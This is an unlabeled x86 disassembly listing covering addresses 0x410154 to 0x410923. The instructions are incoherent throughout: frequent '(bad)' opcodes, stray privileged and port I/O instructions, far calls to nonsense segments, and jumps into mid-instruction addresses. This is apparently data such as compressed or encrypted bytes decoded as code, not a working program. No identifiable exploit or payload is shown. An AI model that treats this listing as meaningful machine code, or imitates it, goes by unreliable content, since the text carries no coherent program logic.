  410154:	sub    ah,BYTE PTR [edx+0x20f306f2]
  41015a:	inc    ebp
  41015b:	cmp    ah,BYTE PTR [esi+0x50]
  41015e:	pop    ds
  41015f:	push   ecx
  410160:	lds    edi,FWORD PTR [eax+0x3d]
  410163:	mov    ch,0x3a
  410165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410166:	or     eax,DWORD PTR [eax+0x5aeb33f2]
  41016c:	xor    edi,ecx
  41016e:	mov    eax,0x35ea4309
  410173:	inc    edi
  410174:	sub    cl,BYTE PTR [edi+ecx*1-0x19f85e23]
  41017b:	int    0xf5
  41017d:	pop    edi
  41017e:	(bad)  
  41017f:	cmp    DWORD PTR [edi],eax
  410181:	test   al,0xcc
  410183:	mov    dl,0x70
  410185:	push   ss
  410186:	push   0xe8b797a5
  41018b:	test   DWORD PTR [esp+ebp*2],ecx
  41018e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41018f:	adc    al,0x67
  410191:	loop   0x410129
  410193:	das    
  410194:	lods   al,BYTE PTR ds:[esi]
  410195:	pop    ebx
  410196:	mov    bl,0x57
  410198:	call   0xb31b:0xd1b04860
  41019f:	les    ecx,FWORD PTR ds:[edi-0x26]
  4101a3:	xchg   ebx,eax
  4101a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101a5:	jno    0x4101db
  4101a7:	pop    ecx
  4101a8:	sbb    dh,BYTE PTR [eax-0x718c4e69]
  4101ae:	mov    BYTE PTR [edi],ah
  4101b0:	inc    ebp
  4101b1:	push   ds
  4101b2:	je     0x410223
  4101b4:	pop    es
  4101b5:	icebp  
  4101b6:	in     al,0x23
  4101b8:	pop    ecx
  4101b9:	sbb    BYTE PTR [eax+0x67da164d],al
  4101bf:	loop   0x410199
  4101c1:	jb     0x410218
  4101c3:	test   eax,0x1ec00ec5
  4101c8:	fild   QWORD PTR [ebp+0x48]
  4101cb:	outs   dx,BYTE PTR ds:[esi]
  4101cc:	pop    edi
  4101cd:	das    
  4101ce:	jge    0x41023b
  4101d0:	pop    esp
  4101d1:	cmp    DWORD PTR [edi-0x41],0xffffffeb
  4101d5:	jbe    0x4101c7
  4101d7:	loope  0x41015d
  4101d9:	lods   eax,DWORD PTR ds:[esi]
  4101da:	mov    ch,0x20
  4101dc:	cmp    DWORD PTR ds:0x820aa505,ebx
  4101e2:	pushf  
  4101e3:	sbb    dh,ah
  4101e5:	mov    eax,ds:0xeec4347c
  4101ea:	adc    dl,BYTE PTR [ebx-0x71]
  4101ed:	call   0xa1aa965
  4101f2:	lods   al,BYTE PTR ds:[esi]
  4101f3:	lahf   
  4101f4:	bound  eax,QWORD PTR [eax]
  4101f6:	inc    ebp
  4101f7:	out    0xb3,eax
  4101f9:	jmp    0x410197
  4101fb:	pop    es
  4101fc:	or     BYTE PTR [ecx-0x30be9551],ah
  410202:	dec    ecx
  410203:	mov    ebp,0x9fc33842
  410208:	fild   QWORD PTR ds:0x52f95a2b
  41020e:	hlt    
  41020f:	cmc    
  410210:	rcr    DWORD PTR [ebx-0x44],cl
  410213:	lods   al,BYTE PTR ds:[esi]
  410214:	sbb    al,0x2c
  410216:	xor    eax,0xb2d84362
  41021b:	iret   
  41021c:	ret    
  41021d:	pop    eax
  41021e:	adc    ebx,DWORD PTR [ebx]
  410220:	adc    bh,BYTE PTR [esi+0x448cdd2a]
  410226:	xchg   esi,eax
  410227:	(bad)
  41022a:	dec    esi
  41022b:	push   es
  41022c:	ds clc 
  41022e:	dec    esp
  41022f:	loopne 0x410246
  410231:	out    0xa8,al
  410233:	xlat   BYTE PTR ds:[ebx]
  410234:	arpl   WORD PTR [esi-0x23fb1030],si
  41023a:	xchg   ebx,eax
  41023b:	mov    BYTE PTR [edi-0x19],ch
  41023e:	icebp  
  41023f:	fcomip st,st(4)
  410241:	das    
  410242:	mov    dl,0x6b
  410244:	add    eax,ebx
  410246:	sub    ebx,DWORD PTR [edx]
  410248:	je     0x410298
  41024a:	pushf  
  41024b:	fld    DWORD PTR [ebx]
  41024d:	add    BYTE PTR [eax+0x5d],0xc3
  410251:	sbb    eax,0xb0ac1496
  410256:	jle    0x4101fa
  410258:	addr16 jmp 0x33f22840
  41025e:	or     eax,0x7768c4fe
  410263:	sbb    ecx,DWORD PTR [edi]
  410265:	mov    dl,0x67
  410267:	enter  0x7ca7,0x0
  41026b:	(bad)  
  41026c:	push   ecx
  41026d:	fwait
  41026e:	mov    bl,0x22
  410270:	pusha  
  410271:	pop    esi
  410272:	inc    eax
  410273:	mov    ebp,0xcf651602
  410278:	fst    DWORD PTR [esi]
  41027a:	sbb    DWORD PTR [ebx-0x356f372c],ebp
  410280:	cmp    BYTE PTR [edx],bh
  410282:	cdq    
  410283:	fstp   DWORD PTR [ebp-0x1f66e91b]
  410289:	fucom  st(4)
  41028b:	es jge 0x41023b
  41028e:	jbe    0x410283
  410290:	in     al,0x86
  410292:	nop
  410293:	ins    DWORD PTR es:[edi],dx
  410294:	int3   
  410295:	sahf   
  410296:	pop    ebp
  410297:	xor    ebp,DWORD PTR [eax+edx*2-0x396771e3]
  41029e:	xchg   edi,eax
  41029f:	in     eax,0xb
  4102a1:	std    
  4102a2:	rcr    BYTE PTR [edx+0x6a],1
  4102a5:	add    ch,ah
  4102a7:	pop    eax
  4102a8:	or     DWORD PTR [ebp-0x1022def4],0xffffffb1
  4102af:	mov    ds:0x63c07786,eax
  4102b4:	add    DWORD PTR [ebx],0xec850f6
  4102ba:	and    BYTE PTR [edx-0x5d7c52ef],ch
  4102c0:	ins    BYTE PTR es:[edi],dx
  4102c1:	daa    
  4102c2:	xor    eax,0xa81b7fa8
  4102c7:	cmp    bl,BYTE PTR cs:[ecx+0x10]
  4102cb:	jno    0x4102bb
  4102cd:	mul    ebx
  4102cf:	rol    DWORD PTR [ebp-0x74],cl
  4102d2:	imul   DWORD PTR [edi-0x62fe5ab0]
  4102d8:	push   ss
  4102d9:	inc    eax
  4102da:	xchg   ebx,eax
  4102db:	lods   al,BYTE PTR ds:[esi]
  4102dc:	jg     0x41025f
  4102de:	ret    
  4102df:	loope  0x41031b
  4102e1:	or     eax,0xa550afed
  4102e6:	sub    DWORD PTR [ebp-0x52f7394e],0x15
  4102ed:	push   esi
  4102ee:	jge    0x4102fc
  4102f0:	mov    dh,0xad
  4102f2:	sub    eax,edi
  4102f4:	dec    edi
  4102f5:	call   0xf7c6:0xf113b2f9
  4102fc:	push   ecx
  4102fd:	push   ds
  4102fe:	retf   0x4aef
  410301:	out    dx,al
  410302:	aaa    
  410303:	jmp    0x19d5:0x95369c84
  41030a:	mov    esp,0x96475ce5
  41030f:	dec    edi
  410310:	add    eax,0xb93d8ecf
  410315:	out    dx,eax
  410316:	js     0x4102de
  410318:	imul   esi,DWORD PTR [ecx+0x4b],0x15
  41031c:	xchg   esp,eax
  41031d:	mov    al,0xe7
  41031f:	lods   eax,DWORD PTR ds:[esi]
  410320:	aad    0xbb
  410322:	iret   
  410323:	ja     0x410319
  410325:	nop
  410326:	outs   dx,DWORD PTR ds:[esi]
  410327:	callw  0xadda
  41032b:	xchg   edi,eax
  41032c:	lea    esi,[eax]
  41032e:	mov    eax,0x41aa73c
  410333:	imul   esi,DWORD PTR [ebx+0x39],0xffffff86
  410337:	shr    DWORD PTR [esi*8-0x48c831ce],0x2b
  41033f:	mov    ah,0x8
  410341:	sbb    ah,BYTE PTR [ecx+0x6993b6b1]
  410347:	sub    al,BYTE PTR [eax]
  410349:	inc    esp
  41034a:	lea    ebx,[eax+ebx*2-0x5b]
  41034e:	push   edx
  41034f:	sbb    ebp,ebp
  410351:	loopne 0x410348
  410353:	cli    
  410354:	test   al,0x8
  410356:	jno    0x4102f4
  410358:	xchg   ecx,eax
  410359:	iret   
  41035a:	cmp    eax,0xa7fdd0f5
  41035f:	packuswb mm2,QWORD PTR [esp+edx*2+0x39]
  410364:	jge    0x410310
  410366:	inc    edx
  410367:	push   0x81417e17
  41036c:	shl    DWORD PTR [ecx+0x42],1
  41036f:	adc    al,BYTE PTR [ecx]
  410371:	mov    ah,0x7c
  410373:	call   0x7feaa7c8
  410378:	pop    edx
  410379:	std    
  41037a:	xchg   edx,eax
  41037b:	adc    BYTE PTR [edx],dh
  41037d:	bound  ecx,QWORD PTR [ebp-0x5c1fbd8c]
  410383:	mov    dl,0x93
  410385:	push   DWORD PTR [edi-0x6b899be4]
  41038b:	sub    cl,BYTE PTR [ecx+0x33d40d4b]
  410391:	and    eax,0x87ac2a46
  410396:	push   0x65c734b0
  41039b:	push   edi
  41039c:	repnz adc DWORD PTR [ebp+0x5c],0xffffffd7
  4103a1:	add    ebp,ebp
  4103a3:	xchg   edi,eax
  4103a4:	inc    eax
  4103a5:	jo     0x410329
  4103a7:	test   al,0x47
  4103a9:	div    DWORD PTR [ecx]
  4103ab:	(bad)  
  4103ac:	shl    DWORD PTR [eax+0x51],1
  4103af:	jo     0x4103aa
  4103b1:	and    esp,DWORD PTR [ebx]
  4103b3:	(bad)  
  4103b4:	fninit 
  4103b6:	(bad)  
  4103b7:	pushf  
  4103b8:	mov    DWORD PTR [ebx+0x1c1cc52e],eax
  4103be:	fcomp  QWORD PTR [eax-0x24a13453]
  4103c4:	icebp  
  4103c5:	stc    
  4103c6:	and    eax,DWORD PTR [edi-0x34fc66fd]
  4103cc:	loop   0x4103e0
  4103ce:	xchg   edx,eax
  4103cf:	sahf   
  4103d0:	xor    esi,esi
  4103d2:	cmc    
  4103d3:	ror    bh,1
  4103d5:	dec    esp
  4103d6:	jg     0x41042b
  4103d8:	sub    al,0x8a
  4103da:	pop    es
  4103db:	and    al,0xb1
  4103dd:	xor    DWORD PTR [edi+ebx*4-0x1b4db6d7],edi
  4103e4:	and    ecx,0xffffff99
  4103e7:	loopne 0x4103b1
  4103e9:	mov    dh,0x56
  4103eb:	and    DWORD PTR [ecx-0x73],0xc096d850
  4103f2:	ja     0x4103c1
  4103f4:	fcomp  DWORD PTR [ecx+0x52]
  4103f7:	aas    
  4103f8:	inc    ebx
  4103f9:	mov    ecx,0x301843f3
  4103fe:	sub    DWORD PTR [ebx+0x40],ebp
  410401:	push   DWORD PTR [ebx]
  410403:	cmp    ah,BYTE PTR [ebp-0x3e]
  410406:	pop    esi
  410407:	mov    bl,0x4a
  410409:	mov    ds:0xdb3d006a,eax
  41040e:	addr16 in al,0xfb
  410411:	and    DWORD PTR [esi],esp
  410413:	dec    esp
  410414:	xor    DWORD PTR [edx+eiz*8-0x72],eax
  410418:	shl    ecx,0x65
  41041b:	cs mov bl,0xb9
  41041e:	adc    al,0xc0
  410420:	div    DWORD PTR ds:0x7a2f307a
  410426:	sub    DWORD PTR [ebp+0x3c783cd3],0x8ab8ffe8
  410430:	xlat   BYTE PTR ds:[ebx]
  410431:	repnz fisubr DWORD PTR [edx]
  410434:	mov    ah,0xb5
  410436:	cmp    DWORD PTR [ebx+0x48e31a9],eax
  41043c:	jbe    0x41045e
  41043e:	jge    0x410460
  410440:	xchg   DWORD PTR [edi-0x72852fce],edx
  410446:	popa   
  410447:	and    eax,0x12c2e148
  41044c:	int    0xf5
  41044e:	stos   DWORD PTR es:[edi],eax
  41044f:	adc    dh,0xa
  410452:	scas   eax,DWORD PTR es:[edi]
  410453:	pushf  
  410454:	jmp    0xba3598b9
  410459:	les    ebx,FWORD PTR [esp+eax*4]
  41045c:	sbb    ch,BYTE PTR [ebp+0x61]
  41045f:	mov    WORD PTR [ebx+0x7f5ed197],ss
  410465:	out    dx,eax
  410466:	inc    eax
  410467:	test   BYTE PTR [edx],bh
  410469:	jbe    0x410434
  41046b:	in     eax,dx
  41046c:	loop   0x4104d9
  41046e:	xor    edx,edx
  410470:	pop    ebp
  410471:	mov    edi,0xfc82721b
  410476:	add    ch,dh
  410478:	sub    BYTE PTR [esi+0x7fa36ceb],bh
  41047e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41047f:	mov    ebx,0x13762515
  410484:	or     al,0xbc
  410486:	inc    ebx
  410488:	scas   eax,DWORD PTR es:[edi]
  410489:	add    ch,BYTE PTR [ecx+eax*8-0x364b1edb]
  410490:	xor    eax,0x9731399b
  410495:	mov    cl,0x66
  410497:	push   ss
  410498:	inc    ebx
  410499:	adc    BYTE PTR [ebx],dl
  41049b:	mov    bl,0x57
  41049d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41049e:	fsub   DWORD PTR [ecx]
  4104a0:	div    BYTE PTR [edi-0x183d773a]
  4104a6:	std    
  4104a7:	mov    WORD PTR [ecx-0x76caf42b],fs
  4104ad:	cmp    eax,DWORD PTR [esi+0x8]
  4104b0:	pusha  
  4104b1:	ret    0x620b
  4104b4:	push   ds
  4104b5:	pop    ss
  4104b6:	mov    ecx,0x8947f869
  4104bb:	push   es
  4104bc:	and    al,0x99
  4104be:	out    0x69,eax
  4104c0:	mov    ecx,0x9ad825c1
  4104c5:	sti    
  4104c6:	std    
  4104c7:	test   BYTE PTR [edi-0x56],ah
  4104ca:	xor    bl,al
  4104cc:	bound  eax,QWORD PTR [esi+ebx*2]
  4104cf:	push   esi
  4104d0:	lods   eax,DWORD PTR ds:[esi]
  4104d1:	adc    al,0xe1
  4104d3:	and    al,BYTE PTR [esi]
  4104d5:	dec    ebx
  4104d6:	es cmp eax,0xe688e8df
  4104dc:	mov    BYTE PTR [esi-0x12],bl
  4104df:	in     eax,dx
  4104e0:	jno    0x41054d
  4104e2:	or     dl,bl
  4104e4:	outs   dx,BYTE PTR ds:[esi]
  4104e5:	aad    0xe6
  4104e7:	lds    edi,FWORD PTR [edi]
  4104e9:	sub    edi,DWORD PTR [esi]
  4104eb:	stc    
  4104ec:	push   esp
  4104ed:	aaa    
  4104ee:	mov    cl,0x40
  4104f0:	dec    edx
  4104f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104f2:	stc    
  4104f3:	lahf   
  4104f4:	mov    esp,0xc3a1c65d
  4104f9:	data16 cmp al,BYTE PTR [ebx+eax*8+0x43]
  4104fe:	sub    eax,0x70327c3
  410503:	mov    cl,0x16
  410505:	cdq    
  410506:	mov    ch,0xbc
  410508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410509:	xor    eax,0xf9e3fdb4
  41050e:	dec    ebx
  41050f:	push   ebp
  410510:	adc    ch,BYTE PTR [edx+0x24ae043]
  410516:	in     eax,dx
  410517:	dec    edx
  410518:	pop    ss
  410519:	test   dl,cl
  41051b:	cdq    
  41051c:	push   esi
  41051d:	(bad)  
  41051e:	out    0x92,eax
  410520:	arpl   WORD PTR [ecx-0x664bab78],bx
  410526:	out    0xe2,al
  410528:	dec    ecx
  410529:	xor    DWORD PTR [esi+0x1856d6f6],ebx
  41052f:	jp     0x4105a6
  410531:	sub    DWORD PTR [edx+eiz*1+0x2bab81e0],0x0
  410539:	fldcw  WORD PTR [ecx-0x3e]
  41053c:	mov    edx,0x61e6303f
  410541:	push   esp
  410542:	mov    cl,BYTE PTR [ecx-0x62493e83]
  410548:	out    dx,al
  410549:	sub    ebp,DWORD PTR [ebp+0x20]
  41054c:	leave  
  41054d:	mov    edi,0x9abc4f54
  410552:	lock das 
  410554:	ror    eax,cl
  410556:	ret    
  410557:	test   al,0xc8
  410559:	outs   dx,BYTE PTR ds:[esi]
  41055a:	in     al,dx
  41055b:	cmp    ebp,DWORD PTR [edx]
  41055d:	sbb    ecx,0xffffffd3
  410560:	mov    al,0xf5
  410562:	iret   
  410563:	addr16 int 0x1b
  410566:	push   ds
  410567:	inc    esi
  410568:	push   ds
  410569:	add    ecx,DWORD PTR [ebx+eiz*8]
  41056c:	leave  
  41056d:	sbb    DWORD PTR [edi-0x6f],esi
  410570:	dec    edx
  410571:	ja     0x41052b
  410573:	or     BYTE PTR [ecx+0x67825dbc],dl
  410579:	jg     0x4105f7
  41057b:	repnz or cl,BYTE PTR [ebp+0x74]
  41057f:	xor    BYTE PTR [edx-0x1d],bl
  410582:	call   FWORD PTR [eax-0x41]
  410585:	cs icebp 
  410587:	ss ins DWORD PTR es:[edi],dx
  410589:	mov    esi,0x4258578a
  41058e:	js     0x410539
  410590:	push   0x7d
  410592:	xchg   DWORD PTR [edx-0x4275a446],ebx
  410598:	or     eax,0xb50e117a
  41059d:	sbb    BYTE PTR [ecx],cl
  41059f:	inc    ebp
  4105a0:	ds jle 0x4105fa
  4105a3:	sub    DWORD PTR [eax+0x68],ebp
  4105a6:	adc    al,0x97
  4105a8:	fisttp WORD PTR [ecx-0x23]
  4105ab:	mov    ebp,0x2f357f48
  4105b0:	sub    DWORD PTR [edx],eax
  4105b2:	fidiv  WORD PTR [edx+0x72]
  4105b5:	aaa    
  4105b6:	xchg   esp,eax
  4105b7:	cdq    
  4105b8:	call   0xa8e2:0x25dc9893
  4105bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105c0:	in     eax,0xef
  4105c2:	jo     0x410633
  4105c4:	and    al,0xbd
  4105c6:	dec    eax
  4105c7:	xor    eax,0x127d3299
  4105cc:	call   0xfb3c:0x980b9d74
  4105d3:	or     eax,edx
  4105d5:	mov    ebx,0x51839a9f
  4105da:	cld    
  4105db:	xor    al,0x29
  4105dd:	sbb    ebp,DWORD PTR [ecx-0x61]
  4105e0:	inc    ebp
  4105e1:	pop    esp
  4105e2:	jmp    0xdd1438b0
  4105e7:	arpl   WORD PTR [eax],bx
  4105e9:	mov    edx,0x92989a26
  4105ee:	add    bh,dl
  4105f0:	mov    dh,0x6a
  4105f2:	mov    bh,0x7f
  4105f4:	gs je  0x410636
  4105f7:	sti    
  4105f8:	repz push eax
  4105fa:	xchg   edi,eax
  4105fb:	rcr    BYTE PTR [ecx-0x62],0xe
  4105ff:	or     DWORD PTR [eax],ebx
  410601:	and    edx,edi
  410603:	dec    ecx
  410604:	bts    ebp,edi
  410607:	and    al,0xec
  410609:	test   DWORD PTR [ecx+esi*8+0x121a98b7],eax
  410610:	push   ecx
  410611:	rol    DWORD PTR [ecx-0x6c2ad51a],1
  410617:	(bad)  
  410618:	jbe    0x410615
  41061a:	sub    esi,DWORD PTR ds:[edx-0x556160a0]
  410621:	stos   DWORD PTR es:[edi],eax
  410622:	pop    ss
  410623:	(bad)  
  410624:	push   ebx
  410625:	(bad)  
  410626:	adc    DWORD PTR [ebx+0x2f674908],esp
  41062c:	cli    
  41062d:	mov    edx,0xaaf38a36
  410632:	inc    ecx
  410633:	adc    edi,DWORD PTR [edx]
  410635:	jmp    0x410631
  410637:	adc    bl,BYTE PTR [ecx+0x2c]
  41063a:	mov    eax,ds:0xd2a00fdb
  41063f:	cmp    ecx,DWORD PTR [ebp-0x79]
  410642:	daa    
  410643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410644:	mov    bl,0x45
  410646:	mov    ebp,0x66f51b4b
  41064b:	jne    0x410697
  41064d:	add    DWORD PTR [edx+0x1ce21269],eax
  410653:	inc    ecx
  410654:	fidivr DWORD PTR [ecx-0x2343b98a]
  41065a:	les    ecx,FWORD PTR [ebx+edi*2+0x3e]
  41065e:	mov    ebp,DWORD PTR [edi+0x1f]
  410661:	mov    ?,WORD PTR [ebx]
  410663:	cmp    al,0xd9
  410665:	add    eax,DWORD PTR ds:[eax]
  410668:	outs   dx,BYTE PTR ds:[esi]
  410669:	leave  
  41066a:	out    0x61,eax
  41066c:	dec    edi
  41066d:	pop    ecx
  41066e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41066f:	jnp    0x41061d
  410671:	lods   eax,DWORD PTR ds:[esi]
  410672:	mov    cl,0xa3
  410674:	pop    ds
  410675:	pop    ebp
  410676:	and    BYTE PTR gs:[eax+ebp*1-0x20],al
  41067b:	outs   dx,BYTE PTR ds:[esi]
  41067c:	jmp    0x4106e5
  41067e:	mov    ds:0x67311f28,eax
  410683:	popf   
  410684:	mov    esp,0x30d49c26
  410689:	push   edi
  41068a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41068b:	pop    ebx
  41068c:	and    eax,0x90ca41c4
  410691:	pop    esi
  410692:	push   edx
  410693:	jmp    0x15c:0x69dc0b18
  41069a:	mov    ds:0x7f7c9525,eax
  41069f:	and    al,dh
  4106a1:	jle    0x4106f1
  4106a3:	jne    0x41065c
  4106a5:	jg     0x4106e2
  4106a7:	add    DWORD PTR [edi+0x3182ba6e],eax
  4106ad:	sub    ah,ah
  4106af:	aad    0x7e
  4106b1:	xor    DWORD PTR [ebx+eiz*4],esp
  4106b4:	jne    0x41070c
  4106b6:	dec    esi
  4106b7:	addr16 mov cl,0x91
  4106ba:	out    0xdb,eax
  4106bc:	push   cs
  4106bd:	or     BYTE PTR [ebx-0x523c7810],0xcd
  4106c4:	repnz pop eax
  4106c6:	mov    ds:0x74cec602,eax
  4106cb:	cmp    eax,0xc8c762b
  4106d0:	jmp    0x41067f
  4106d2:	pop    ds
  4106d3:	jmp    0x41065b
  4106d5:	mov    ebp,esp
  4106d7:	(bad)  
  4106d9:	stc    
  4106da:	(bad)  
  4106db:	js     0x41070f
  4106dd:	push   esp
  4106de:	mov    al,ah
  4106e0:	lods   al,BYTE PTR ds:[esi]
  4106e1:	push   0x60
  4106e3:	lods   al,BYTE PTR ds:[esi]
  4106e4:	js     0x410763
  4106e6:	or     dh,BYTE PTR [ecx]
  4106e8:	mov    dl,0x96
  4106ea:	in     al,dx
  4106eb:	push   eax
  4106ec:	retf   
  4106ed:	adc    DWORD PTR [ecx-0x5c],0x580f1f3f
  4106f4:	sub    DWORD PTR [ebx+0x173a7079],0x5538a14a
  4106fe:	imul   ebp,DWORD PTR [ecx+ebp*4-0x10d1fb4f],0xffffff8d
  410706:	jmp    0xad4b72a3
  41070b:	repz dec edx
  41070d:	iret   
  41070e:	or     eax,DWORD PTR [edi-0x39]
  410711:	mov    ds:0x6bd1610a,eax
  410716:	test   DWORD PTR [ebx+ecx*1+0x37],edi
  41071a:	jl     0x41073f
  41071c:	lods   al,BYTE PTR ds:[esi]
  41071d:	ret    
  41071e:	push   esp
  41071f:	dec    ebx
  410720:	loope  0x410706
  410722:	fnsave [ebp-0x3a905cb8]
  410728:	dec    edi
  410729:	mov    ecx,0x35e43222
  41072e:	or     BYTE PTR [ecx],al
  410730:	inc    edi
  410731:	sbb    al,0x94
  410733:	test   eax,0x78b5ebcc
  410738:	push   eax
  410739:	out    dx,eax
  41073a:	cmp    BYTE PTR [edi],0x2
  41073d:	adc    BYTE PTR [edi-0x30],dl
  410740:	(bad)  
  410741:	jmp    0xb897:0x4ff2b781
  410748:	push   ebx
  410749:	rol    BYTE PTR [ecx],0x1a
  41074c:	in     eax,dx
  41074d:	aam    0xc2
  41074f:	iret   
  410750:	mov    bh,0x76
  410752:	in     eax,0x9b
  410754:	dec    esp
  410755:	add    ebx,DWORD PTR [edx+eiz*2]
  410758:	lods   al,BYTE PTR ds:[esi]
  410759:	cs loop 0x410787
  41075c:	add    BYTE PTR [eax-0x78c3fd33],ch
  410762:	jno    0x410792
  410764:	and    BYTE PTR [ebp+0x230b57d5],bh
  41076a:	pop    esp
  41076b:	test   eax,0xae733701
  410770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410771:	sar    BYTE PTR [esi-0x26047166],0xf5
  410778:	jnp    0x410734
  41077a:	ins    DWORD PTR es:[edi],dx
  41077b:	jnp    0x4107f7
  41077d:	in     eax,0x61
  41077f:	jmp    0xed74947a
  410784:	jbe    0x410767
  410786:	repnz dec edi
  410788:	mov    DWORD PTR [edi+0x2d],ebx
  41078b:	lods   eax,DWORD PTR ds:[esi]
  41078c:	pop    ebx
  41078d:	int    0x84
  41078f:	push   es
  410790:	xchg   esi,eax
  410791:	psllw  mm6,QWORD PTR [edx-0xedbc010]
  410798:	fnstenv [ecx-0x764fd651]
  41079e:	mov    ah,0xe7
  4107a0:	add    al,0x9c
  4107a2:	lods   al,BYTE PTR ds:[esi]
  4107a3:	pop    esp
  4107a4:	ja     0x4107e6
  4107a6:	imul   ecx,DWORD PTR [edi],0x13
  4107a9:	enter  0xacb5,0xb3
  4107ad:	mov    al,ds:0xda07469d
  4107b2:	xor    edi,DWORD PTR [esi]
  4107b4:	add    al,0xf2
  4107b6:	xor    al,0x1d
  4107b8:	fnstcw WORD PTR [eax]
  4107ba:	outs   dx,BYTE PTR ds:[esi]
  4107bb:	std    
  4107bc:	mov    dl,0x2b
  4107be:	clc    
  4107bf:	sbb    DWORD PTR [ecx],esi
  4107c1:	sbb    eax,0x11e8b49b
  4107c6:	xchg   ebx,eax
  4107c7:	inc    esi
  4107c8:	mov    ecx,0x9df241fc
  4107cd:	push   0x2c3c3846
  4107d2:	dec    esi
  4107d3:	jl     0x410757
  4107d5:	xor    BYTE PTR [ecx],0x12
  4107d8:	das    
  4107d9:	mov    dh,0xb1
  4107db:	mov    esi,DWORD PTR [eax+0x1f]
  4107de:	(bad)  
  4107e0:	retf   
  4107e1:	das    
  4107e2:	mov    esi,0x64ce2c36
  4107e7:	loopne 0x410786
  4107e9:	dec    esi
  4107ea:	mov    eax,ds:0xd432c15d
  4107ef:	ja     0x41077a
  4107f1:	mov    al,ds:0xa8c8f5e8
  4107f6:	and    al,0x30
  4107f8:	mov    edi,0xc9651c45
  4107fd:	scas   al,BYTE PTR es:[edi]
  4107fe:	shl    BYTE PTR [eax-0x60],cl
  410801:	mov    ecx,0xc9276bf0
  410806:	pop    esp
  410807:	mov    dh,0xe4
  41080a:	addr16 mov cl,0x99
  41080d:	(bad)  
  41080e:	mov    ah,0x90
  410810:	and    ebx,esi
  410812:	push   cs
  410813:	iret   
  410814:	xor    eax,edx
  410816:	mov    ds:0xd2a57bf9,eax
  41081b:	hlt    
  41081c:	lods   eax,DWORD PTR ds:[esi]
  41081d:	stos   BYTE PTR es:[edi],al
  41081e:	lds    ebp,FWORD PTR [ebp+eax*2+0x23f0efd]
  410825:	mov    bh,0xa9
  410827:	outs   dx,BYTE PTR ds:[esi]
  410828:	mov    al,0x1d
  41082a:	shl    BYTE PTR [esi+0x5c2737b8],1
  410830:	inc    esi
  410831:	in     eax,dx
  410832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410833:	mov    ebx,0x1c3f2159
  410838:	dec    esi
  410839:	ror    BYTE PTR [ecx+0x2a0b36ab],1
  41083f:	inc    edx
  410840:	push   es
  410841:	(bad)  
  410842:	adc    DWORD PTR [ecx],esp
  410844:	shl    bl,cl
  410846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410847:	test   eax,0xd2dbb62f
  41084c:	loope  0x4107ec
  41084e:	ss fmul st(7),st
  410851:	cmp    DWORD PTR [edi-0x2a1fbd91],esp
  410857:	and    dh,BYTE PTR [ebx+0x5a]
  41085a:	shl    DWORD PTR [ecx-0x3b8dde99],cl
  410860:	xor    dl,ch
  410862:	fbstp  TBYTE PTR [eax+eax*4+0x12fdf1c0]
  410869:	xor    DWORD PTR [edx-0x5f],edi
  41086c:	mov    ch,0x5f
  41086e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41086f:	cmc    
  410870:	pop    edi
  410871:	int3   
  410872:	inc    ebx
  410873:	and    al,0xe3
  410875:	mov    edi,DWORD PTR [esi+0x5db160fa]
  41087b:	ja     0x410821
  41087d:	loopne 0x41089c
  41087f:	push   ebx
  410880:	jno    0x410901
  410882:	xor    bl,BYTE PTR [ebp-0x3c]
  410885:	sbb    ebp,edx
  410887:	nop
  410888:	clc    
  410889:	in     eax,dx
  41088a:	push   0x2e
  41088c:	mov    ebx,0xcfbbad86
  410891:	into   
  410892:	inc    esi
  410893:	lock int3 
  410895:	ins    DWORD PTR es:[edi],dx
  410896:	pop    edi
  410897:	loop   0x410833
  410899:	call   0x901b:0x330b92b5
  4108a0:	das    
  4108a1:	imul   edi,DWORD PTR [edi-0xa],0xffffffb9
  4108a5:	rcl    DWORD PTR [esp+edx*8-0x10012720],1
  4108ac:	retf   
  4108ad:	push   esi
  4108ae:	in     al,dx
  4108af:	(bad)  
  4108b0:	(bad)  
  4108b1:	repnz fwait
  4108b3:	or     cl,BYTE PTR [edx+0x6f9d0df2]
  4108b9:	ins    DWORD PTR es:[edi],dx
  4108ba:	jbe    0x4108b5
  4108bc:	lods   eax,DWORD PTR ds:[esi]
  4108bd:	inc    ecx
  4108be:	mov    edi,0xd141ebd0
  4108c3:	and    al,0x8a
  4108c5:	cmp    cl,BYTE PTR [edx]
  4108c7:	mov    bl,0x6d
  4108c9:	rol    DWORD PTR [edi],0x9c
  4108cc:	mov    dl,0xe3
  4108ce:	push   esp
  4108cf:	shl    ebx,cl
  4108d1:	or     al,0x0
  4108d3:	std    
  4108d4:	push   0x4f
  4108d6:	es jns 0x41090d
  4108d9:	mov    ch,0x50
  4108db:	cmp    DWORD PTR [ecx-0x77e0078e],0xffffffcf
  4108e2:	mov    eax,0xe635884d
  4108e7:	push   esi
  4108e8:	adc    BYTE PTR [edx-0x46],al
  4108eb:	dec    esp
  4108ec:	stos   DWORD PTR es:[edi],eax
  4108ed:	icebp  
  4108ee:	pop    edi
  4108ef:	jmp    0x32f5cfef
  4108f4:	mov    bl,0xea
  4108f6:	cld    
  4108f7:	addr16 mov ah,0xfe
  4108fa:	pop    edx
  4108fb:	fstp   st(6)
  4108fd:	cmp    eax,0x910fa211
  410902:	jge    0x41095e
  410904:	loop   0x4108dc
  410906:	je     0x4108b0
  410908:	out    dx,al
  410909:	ss mov cl,0xf2
  41090c:	cmp    al,0x57
  41090e:	pop    esi
  41090f:	ror    DWORD PTR [eax],cl
  410911:	sub    edi,DWORD PTR [edx+0x64e15069]
  410917:	enter  0xeea,0xe3
  41091b:	push   es
  41091c:	mov    ebx,0x440e33c1
  410921:	jl     0x41097a
  410923:	sbb    al,0x4a
